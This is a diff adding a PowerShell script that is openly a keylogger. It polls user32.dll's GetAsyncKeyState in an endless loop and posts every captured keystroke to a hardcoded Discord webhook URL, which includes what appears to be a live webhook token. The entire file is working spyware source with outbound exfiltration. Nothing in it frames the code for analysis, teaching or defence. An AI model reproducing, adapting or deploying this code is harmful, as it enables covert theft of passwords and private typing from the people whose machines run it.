@@ -1,0 +1,43 @@
+# Discord Webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1344607221740343337/lwdCUq4o12NlLCdVRyjodVoZLeUpvA_liHKdoo8tz0LvrfEekbLFnTDKbZEyScNzT_Zv"
+
+# Function to send data to Discord
+function Send-LogToDiscord {
+    param([string]$message)
+
+    try {
+        $payload = @{ content = $message } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+    } catch {
+        Write-Host "Error sending message to Discord: $_"
+    }
+}
+
+# Load Windows API for keylogging
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class KeyLogger {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@ -Name "KeyLogger" -Namespace "KeyLoggerNamespace"
+
+# Keylogger loop
+while ($true) {
+    for ($i = 8; $i -lt 256; $i++) {
+        if ([KeyLoggerNamespace.KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
+            $key = [char]$i
+            if ($i -eq 13) { $key = "[ENTER]" }
+            if ($i -eq 8) { $key = "[BACKSPACE]" }
+            if ($i -eq 9) { $key = "[TAB]" }
+            if ($i -eq 32) { $key = "[SPACE]" }
+
+            # Send keystroke to Discord
+            Send-LogToDiscord -message "Key pressed: $key"
+
+            # Prevent flooding
+            Start-Sleep -Milliseconds 100
+        }
+    }
+}
